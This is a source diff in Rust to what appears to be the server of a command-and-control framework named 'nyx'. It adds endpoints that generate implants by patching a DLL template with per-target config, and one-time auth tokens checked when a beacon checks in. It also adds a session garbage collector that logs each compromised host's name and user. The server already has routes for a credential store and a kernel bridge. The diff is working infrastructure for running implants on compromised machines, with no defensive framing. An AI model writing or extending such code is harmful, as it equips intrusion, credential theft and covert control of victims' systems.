@@ -7,6 +7,7 @@
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
 pub mod audit;
+pub mod implant_gen;
 pub mod kernel;
 pub mod operators;
 pub mod tls;
@@ -50,6 +51,7 @@ use nyx_protocol::{
     Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
 };
 use serde::{Deserialize, Serialize};
+use sha2::Digest;
 
 /// A session is keyed by the implant's 32-byte ephemeral public key.
 pub type SessionId = [u8; 32];
@@ -63,6 +65,9 @@ pub struct Session {
     pub pending: Vec<Task>,
     pub results: Vec<TaskResponse>,
     pub created: Instant,
+    /// Time of the most recent beacon check-in (updated on every valid frame).
+    /// Used by the session GC to evict idle sessions.
+    pub last_seen: Instant,
     /// Inbound TLS JA3 (MD5, 32 hex) of the connecting beacon, if captured by
     /// the ClientHello sniffer. `None` on plaintext or when sniff failed.
     pub ja3: Option<String>,
@@ -103,6 +108,18 @@ pub struct AppState {
     pub audit: Option<Arc<audit::AuditWriter>>,
     /// Kernel daemon bridge (P6). `None` when no daemon configured.
     pub kernel: Option<Arc<kernel::KernelBridge>>,
+    /// DLL template for implant generation (loaded at startup via `--template`).
+    /// The server patches this in-memory DLL at generation time to embed the
+    /// per-implant config. `None` = implant generation disabled.
+    pub template: Option<Arc<Vec<u8>>>,
+    /// Rate limiter for the implant generation endpoint. Keyed by
+    /// "callback:port", stores sliding-window timestamps of recent generation
+    /// requests to prevent enumeration/spray against a single target.
+    pub implant_rate_limiter: DashMap<String, Vec<Instant>>,
+    /// Persistent implant/payload store (SQLite, WAL). Shared with the cred
+    /// store's DB file; manages the `implants` table. `None` if no store path
+    /// was configured (test/dev mode).
+    pub implants: Option<Arc<nyx_store::ImplantStore>>,
 }
 
 /// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
@@ -135,6 +152,9 @@ impl Default for AppState {
             operators: Arc::new(operators::OperatorRegistry::empty()),
             audit: None,
             kernel: None,
+            template: None,
+            implant_rate_limiter: DashMap::new(),
+            implants: None,
         }
     }
 }
@@ -259,6 +279,80 @@ pub fn load_script(path: &std::path::Path) -> anyhow::Result<nyx_scripting_rhai:
         .map_err(|e| anyhow::anyhow!("compile script {}: {e}", path.display()))
 }
 
+// ── Session GC ────────────────────────────────────────────────────────────
+
+/// Default maximum session age in seconds (7 days). Override with
+/// `NYX_SESSION_MAX_AGE`.
+const DEFAULT_SESSION_MAX_AGE: u64 = 7 * 24 * 3600;
+/// Default maximum session idle time in seconds (24 hours). Override with
+/// `NYX_SESSION_MAX_IDLE`. Sessions with pending tasks are NOT evicted by idle.
+const DEFAULT_SESSION_MAX_IDLE: u64 = 24 * 3600;
+
+/// Spawn a background task that periodically evicts stale sessions.
+///
+/// Two policies run every 60 seconds:
+/// 1. Age: evict sessions older than `NYX_SESSION_MAX_AGE` (default 7 days).
+/// 2. Idle: evict sessions idle (no beacon) longer than `NYX_SESSION_MAX_IDLE`
+///    (default 24h) that have zero pending tasks.
+///
+/// Each eviction is logged at INFO level so operators can see when a beacon
+/// drops offline permanently.
+pub fn spawn_session_gc(state: Arc<AppState>) {
+    let max_age = std::env::var("NYX_SESSION_MAX_AGE")
+        .ok()
+        .and_then(|s| s.parse::<u64>().ok())
+        .unwrap_or(DEFAULT_SESSION_MAX_AGE);
+    let max_idle = std::env::var("NYX_SESSION_MAX_IDLE")
+        .ok()
+        .and_then(|s| s.parse::<u64>().ok())
+        .unwrap_or(DEFAULT_SESSION_MAX_IDLE);
+
+    tokio::spawn(async move {
+        let mut interval = tokio::time::interval(std::time::Duration::from_secs(60));
+        loop {
+            interval.tick().await;
+            let now = Instant::now();
+            // Collect keys to evict under read-only iteration first (avoids
+            // holding a write-lock while doing duration arithmetic).
+            let evicted: Vec<SessionId> = state
+                .sessions
+                .iter()
+                .filter_map(|entry| {
+                    let age = now.duration_since(entry.value().created).as_secs();
+                    let idle = now.duration_since(entry.value().last_seen).as_secs();
+                    if age > max_age {
+                        Some(*entry.key())
+                    } else if idle > max_idle && entry.value().pending.is_empty() {
+                        Some(*entry.key())
+                    } else {
+                        None
+                    }
+                })
+                .collect();
+
+            for key in &evicted {
+                if let Some((_, s)) = state.sessions.remove(key) {
+                    let age = now.duration_since(s.created).as_secs();
+                    let idle = now.duration_since(s.last_seen).as_secs();
+                    tracing::info!(
+                        session = %hex::encode(key),
+                        host = %s.info.hostname,
+                        user = %s.info.username,
+                        age_secs = age,
+                        idle_secs = idle,
+                        pending = s.pending.len(),
+                        "session evicted by GC"
+                    );
+                }
+            }
+
+            if !evicted.is_empty() {
+                tracing::info!(evicted = evicted.len(), "session GC sweep complete");
+            }
+        }
+    });
+}
+
 pub fn router(state: Arc<AppState>) -> Router {
     // Collect any profile-declared beacon URIs + their `set verb` before `state`
     // moves into the router. The beacon handler is URI-agnostic (it just
@@ -326,6 +420,13 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/api/creds/delete", post(delete_cred))
         .route("/api/audit", get(get_audit))
         .route("/api/audit/verify", get(verify_audit))
+        // Implant generation (requires NYX_TEMPLATE + implant store at runtime)
+        .route(
+            "/api/generate-implant",
+            post(implant_gen::generate_implant),
+        )
+        .route("/api/implants", get(implant_gen::list_implants))
+        .route("/api/implant/revoke", post(implant_gen::revoke_implant))
         .layer(DefaultBodyLimit::max(4 * 1024 * 1024));
 
     // Kernel daemon bridge routes (P6): ONLY register when a `KernelBridge` is
@@ -610,6 +711,46 @@ fn handle_beacon(
         }
         let mut r = Reader::new(&plaintext);
         let info = SessionInfo::decode(&mut r)?;
+
+        // Validate one-time auth_token if present (per-implant generated implants).
+        // Legacy implants (compile-time config, no token) skip this check.
+        if let Some(ref token) = info.auth_token {
+            let mut hasher = sha2::Sha256::new();
+            hasher.update(token);
+            let token_hash = hex::encode(hasher.finalize());
+
+            match &st.implants {
+                Some(store) => {
+                    match store.get_by_token_hash(&token_hash) {
+                        Ok(Some(rec)) => {
+                            // Token valid — mark as consumed.
+                            let _ = store.mark_token_used(&rec.implant_pub);
+                            tracing::info!(
+                                implant_pub = %rec.implant_pub,
+                                implant_id = rec.id,
+                                "auth_token validated and consumed"
+                            );
+                        }
+                        Ok(None) => {
+                            // Token not found, already used, or revoked.
+                            anyhow::bail!(
+                                "auth_token rejected: not found, already consumed, or revoked"
+                            );
+                        }
+                        Err(e) => {
+                            // Store error — log and allow (don't block beacon on DB failure).
+                            tracing::warn!(error = %e, "implant store error during token check; allowing check-in");
+                        }
+                    }
+                }
+                None => {
+                    // No implant store — token was sent but can't be validated.
+                    // In strict mode we'd reject this; for now, log and allow.
+                    tracing::warn!("auth_token present but no implant store; token NOT validated");
+                }
+            }
+        }
+
         tracing::info!(
             beacon_id = info.beacon_id,
             host = %info.hostname,
@@ -644,6 +785,7 @@ fn handle_beacon(
             pending: Vec::new(),
             results: Vec::new(),
             created: Instant::now(),
+            last_seen: Instant::now(),
             ja3: fp.ja3,
             ja4: fp.ja4,
         };
@@ -692,6 +834,7 @@ fn handle_beacon(
             anyhow::bail!("replayed/stale counter {}", raw.counter);
         }
         s.last_recv = raw.counter;
+        s.last_seen = Instant::now();
         let responses = TaskResponse::decode_vec(&plaintext)?;
         // Snapshot the scripting-event payloads now (we're about to move
         // `responses` into s.results), then fire them AFTER dropping the guard
@@ -1974,6 +2117,7 @@ mod tests {
             arch: 1,
             pid: 42,
             is_admin: 0,
+            auth_token: None,
         };
         let mut w = nyx_protocol::wire::Writer::new();
         info.encode(&mut w)
@@ -2076,6 +2220,7 @@ mod tests {
                 arch: 0,
                 pid: 0,
                 is_admin: 0,
+                auth_token: None,
             },
             last_recv: 0,
             send_counter: 0,
@@ -2083,6 +2228,7 @@ mod tests {
             pending: Vec::new(),
             results: Vec::new(),
             created: Instant::now(),
+            last_seen: Instant::now(),
             ja3: None,
             ja4: None,
         }
